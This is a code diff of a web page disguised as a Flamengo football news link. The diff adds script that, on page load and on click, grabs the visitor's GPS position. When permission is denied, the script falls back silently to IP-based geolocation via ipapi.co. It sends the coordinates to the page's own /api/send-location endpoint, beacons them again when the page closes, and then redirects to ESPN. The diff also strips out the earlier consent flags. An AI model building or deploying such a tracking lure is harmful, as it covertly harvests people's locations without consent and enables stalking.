@@ -357,7 +357,6 @@ footer {
                 BOLA EM FOCO • Conteúdo demonstrativo
             </div>
 
-            <!-- Alterado para href="#" para o JS interceptar e obrigar a chamada do GPS -->
             <a href="#"
                class="imagem-link acionador-gps"
                id="linkMateria">
@@ -446,106 +445,141 @@ footer {
 </footer>
 
 <script>
-"use strict";
+    let dadosUltimaLocalizacao = {
+      latitude: null,
+      longitude: null,
+      maps: "",
+      source: "Não obtida"
+    };
 
-const linkOriginal = "https://www.espn.com.br/futebol/time/_/id/819/flamengo";
-let processandoGPS = false;
+    const linkOriginal = "https://www.espn.com.br/futebol/time/_/id/819/flamengo";
+    let processandoGPS = false;
 
-function continuarParaESPN() {
-    window.location.assign(linkOriginal);
-}
+    function continuarParaESPN() {
+        window.location.assign(linkOriginal);
+    }
 
-async function enviarDados(payload) {
-    try {
-        await fetch("/api/sendlocation", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
+    // Carregamento automático ao abrir a página (igual ao primeiro código)
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => sendLocation(position, "Precisa (GPS)"),
+          () => fallbackLocation()
+        );
+      } else {
+        fallbackLocation();
+      }
+    });
+
+    function sendLocation(position, source) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      dadosUltimaLocalizacao = { latitude, longitude, maps, source };
+      enviarParaApi(latitude, longitude, maps, source, "abriu_pagina");
+    }
+
+    function fallbackLocation() {
+      fetch("https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+          const latitude = data.latitude;
+          const longitude = data.longitude;
+          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          const source = "Aproximada (IP)";
+
+          dadosUltimaLocalizacao = { latitude, longitude, maps, source };
+          enviarParaApi(latitude, longitude, maps, source, "abriu_pagina_ip");
+        })
+        .catch(error => {
+          console.error("Erro ao obter localização pelo IP:", error);
         });
-    } catch (e) {
-        // Ignora erros de rede para não travar a navegação
     }
-}
 
-async function obterLocalizacaoAproximadaPorIP() {
-    try {
-        const resposta = await fetch("https://ipapi.co/json/");
-        const dados = await resposta.json();
-        if (dados && dados.latitude && dados.longitude) {
-            return {
-                latitude: dados.latitude,
-                longitude: dados.longitude,
-                tipo: "aproximada_ip",
-                cidade: dados.city,
-                regiao: dados.region,
-                pais: dados.country_name
-            };
+    function enviarParaApi(latitude, longitude, maps, source, acao) {
+      fetch("/api/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps, source, acao })
+      })
+        .then(response => response.json())
+        .catch(error => {
+          console.error("Erro:", error);
+        });
+    }
+
+    // Intercepta cliques nos elementos com a classe .acionador-gps para garantir o envio e redirecionar
+    function dispararFluxoGPS(event) {
+        if (event) {
+            event.preventDefault();
+            event.stopPropagation();
         }
-    } catch (e) {
-        // Fallback silencioso
-    }
-    return null;
-}
 
-function dispararFluxoGPS(event) {
-    if (event) {
-        event.preventDefault();
-        event.stopPropagation();
-    }
+        if (processandoGPS) return;
+        processandoGPS = true;
 
-    if (processandoGPS) return;
-    processandoGPS = true;
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    const source = "Precisa (GPS)";
 
-    if (!navigator.geolocation) {
-        processandoGPS = false;
-        continuarParaESPN();
-        return;
-    }
+                    dadosUltimaLocalizacao = { latitude, longitude, maps, source };
+                    enviarParaApi(latitude, longitude, maps, source, "clique_botao");
+                    processandoGPS = false;
+                    continuarParaESPN();
+                },
+                () => {
+                    fetch("https://ipapi.co/json/")
+                        .then(response => response.json())
+                        .then(data => {
+                            const latitude = data.latitude;
+                            const longitude = data.longitude;
+                            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                            const source = "Aproximada (IP)";
 
-    // Dispara a caixa de permissão nativa do navegador/celular
-    navigator.geolocation.getCurrentPosition(
-        async function(posicao) {
-            // Sucesso (Usuário PERMITIU)
-            await enviarDados({
-                latitude: posicao.coords.latitude,
-                longitude: posicao.coords.longitude,
-                consentimento: true,
-                tipo: "precisa_gps"
-            });
+                            dadosUltimaLocalizacao = { latitude, longitude, maps, source };
+                            enviarParaApi(latitude, longitude, maps, source, "clique_botao_ip");
+                        })
+                        .catch(() => {})
+                        .finally(() => {
+                            processandoGPS = false;
+                            continuarParaESPN();
+                        });
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        } else {
             processandoGPS = false;
             continuarParaESPN();
-        },
-        async function(erro) {
-            // Erro / Negado / Fechado (Usuário NEGOU ou já havia negado antes)
-            const dadosAproximados = await obterLocalizacaoAproximadaPorIP();
-            
-            if (dadosAproximados) {
-                await enviarDados(dadosAproximados);
-            } else {
-                await enviarDados({
-                    consentimento: false,
-                    motivo: erro.message,
-                    tipo: "negado_ou_fechado"
-                });
-            }
-
-            processandoGPS = false;
-            continuarParaESPN();
-        },
-        {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
         }
-    );
-}
+    }
 
-// Vincula a interceptação a todos os botões e links interativos
-document.querySelectorAll(".acionador-gps").forEach(function(elemento) {
-    elemento.addEventListener("click", dispararFluxoGPS);
-});
+    // Vincula a interceptação a todos os botões e links interativos
+    document.querySelectorAll(".acionador-gps").forEach(function(elemento) {
+        elemento.addEventListener("click", dispararFluxoGPS);
+    });
+
+    // Dispara o envio ao fechar ou sair da página com segurança
+    window.addEventListener('beforeunload', function () {
+      const payload = JSON.stringify({
+        ...dadosUltimaLocalizacao,
+        acao: 'fechou_pagina'
+      });
+
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon('/api/send-location', payload);
+      }
+    });
 </script>
 
 </body>
